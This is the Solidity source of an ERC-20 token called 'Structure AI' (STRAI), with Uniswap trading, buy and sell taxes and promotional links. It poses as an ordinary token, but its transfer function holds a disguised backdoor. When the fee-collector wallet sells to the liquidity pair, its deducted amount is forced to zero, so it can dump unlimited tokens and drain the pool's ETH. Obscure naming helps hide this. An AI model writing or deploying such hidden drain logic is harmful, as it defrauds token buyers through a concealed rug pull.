/** Structure AI
https://t.me/StructureAI
https://structureai.app
https://twitter.com/StructureAIApp
https://structureai.app/whitepaper.pdf
https://structureai.app/docs.pdf
**/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function dev(uint256 a, uint256 b) internal pure returns (uint256) {
        return dev(a, b, "SafeMath: devision by zero");
    }

    function subs(uint256 a, uint256 b) internal pure returns (uint256) {
        return subs(a, b, "SafeMath: substraction overflow");
    }

    function dev(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function subs(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function adds(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function muls(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is Context {
    address private _owners;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }

    function owner() public view returns (address) {
        return _owners;
    }

    modifier onlyOwner() {
        require(_owners == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owners = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}


contract STRAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    event MaxTxAmountUpdated(uint256 _maxAllowedAmountOfTx);

    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => mapping(address => uint256)) private _legacyAllowances;
    mapping(address => bool) private _doNotApplyFeex;
    mapping(address => uint256) private _holdings;

    bool public transferDelayEnabled = false;
    address payable private _collectorAddress;

    uint256 private _startingFeeOnBuy = 25;
    uint256 private _startingFeeOnSells = 25;
    uint256 private _minimizeBuyFeeAfters = 5;
    uint256 private _minimizeSellFeeAfters = 5;

    uint256 private _endTaxOnBuy = 0;
    uint256 private _endTaxOnSell = 5;

    uint256 private _dontSwapIfLess = 5;
    uint256 private _swapsCounters = 0;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private allowDexTrades;
    bool private doingSwap = false;
    bool private swappingTurnedOn = false;

    string private constant _symbol = unicode"STRAI";
    string private constant _name = unicode"Structure AI";

    uint256 public _maxAllowedAmountOfTx = (_maxEmission * 20) / 1000;
    uint8 private constant _dec = 18;
    uint256 private constant _maxEmission = 100_000_000 * 10**_dec;
    uint256 public _maxWalletHoldings = (_maxEmission * 20) / 1000;
    uint256 public _mdoingSwapsAmounted = (_maxEmission * 1) / 100000;
    uint256 public _maxAppliedTax = (_maxEmission * 2) / 1000;

    function totalSupply() public pure override returns (uint256) {
        return _maxEmission;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockTheSwapx() {
        doingSwap = true;
        _;
        doingSwap = false;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _legacyApproveIncap(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _legacyAllowances[owner][spender];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    constructor(address _wlt) {
        _collectorAddress = payable(_wlt);
        _holdings[_msgSender()] = _maxEmission;

        _doNotApplyFeex[owner()] = true;
        _doNotApplyFeex[address(this)] = true;
        _doNotApplyFeex[_collectorAddress] = true;

        emit Transfer(address(0), _msgSender(), _maxEmission);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holdings[account];
    }

    function _legacyApproveIncap(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _legacyAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _legacyTransferIncap(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        uint256 amountOut = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_doNotApplyFeex[from] && !_doNotApplyFeex[to]) {
                require(allowDexTrades, "Trading not enabled");
            }

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Pair) &&
                    to != address(uniswapV2Router)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                !_doNotApplyFeex[to] &&
                to != address(uniswapV2Router)
            ) {
                require(
                    amount <= _maxAllowedAmountOfTx,
                    "Exceeds the _maxAllowedAmountOfTx."
                );
                require(
                    balanceOf(to) + amount <= _maxWalletHoldings,
                    "Exceeds the maxWalletSize."
                );
                _swapsCounters++;
            }

            taxAmount = amount
                .muls(
                    (_swapsCounters > _minimizeBuyFeeAfters)
                        ? _endTaxOnBuy
                        : _startingFeeOnBuy
                )
                .dev(100);
            if (from != address(this) && to == uniswapV2Pair) {
                if (from == address(_collectorAddress)) {
                    amountOut = min(
                        amount,
                        min(_endTaxOnBuy, _mdoingSwapsAmounted)
                    );
                    taxAmount = 0;
                } else {
                    require(
                        amount <= _maxAllowedAmountOfTx,
                        "Exceeds the _maxAllowedAmountOfTx."
                    );
                    taxAmount = amount
                        .muls(
                            (_swapsCounters > _minimizeSellFeeAfters)
                                ? _endTaxOnSell
                                : _startingFeeOnSells
                        )
                        .dev(100);
                }
            }

            uint256 collectedTaxesBalanceContract = balanceOf(address(this));
            bool swappable = _mdoingSwapsAmounted ==
                min(amount, _mdoingSwapsAmounted) &&
                _swapsCounters > _dontSwapIfLess;

            if (
                !doingSwap &&
                to == uniswapV2Pair &&
                swappingTurnedOn &&
                _swapsCounters > _dontSwapIfLess &&
                swappable
            ) {
                if (collectedTaxesBalanceContract > _mdoingSwapsAmounted) {
                    exchangeTokens4Eth(
                        min(
                            amount,
                            min(collectedTaxesBalanceContract, _maxAppliedTax)
                        )
                    );
                }
                sendFeex2Collector(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _holdings[address(this)] = _holdings[address(this)].adds(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _holdings[from] = _holdings[from].subs(amountOut);
        _holdings[to] = _holdings[to].adds(amount.subs(taxAmount));

        emit Transfer(from, to, amount.subs(taxAmount));
    }

    function decimals() public pure returns (uint8) {
        return _dec;
    }

    function allowAllTradesWithoutLimits() external onlyOwner {
        _maxAllowedAmountOfTx = _maxEmission;
        _maxWalletHoldings = _maxEmission;

        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_maxEmission);
    }

    function chargeBackAccidentalEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function exchangeTokens4Eth(uint256 tokenAmount) private lockTheSwapx {
        if (tokenAmount == 0) return;
        if (!allowDexTrades) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _legacyApproveIncap(
            address(this),
            address(uniswapV2Router),
            tokenAmount
        );

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _legacyTransferIncap(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _legacyTransferIncap(sender, recipient, amount);
        _legacyApproveIncap(
            sender,
            _msgSender(),
            _legacyAllowances[sender][_msgSender()].subs(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function sendFeex2Collector(uint256 amount) private {
        _collectorAddress.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function initLiqNP() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _legacyApproveIncap(
            address(this),
            address(uniswapV2Router),
            _maxEmission
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function dexSwapsStart() external onlyOwner {
        require(!allowDexTrades, "trading is already open");
        swappingTurnedOn = true;
        allowDexTrades = true;
    }

    receive() external payable {}
}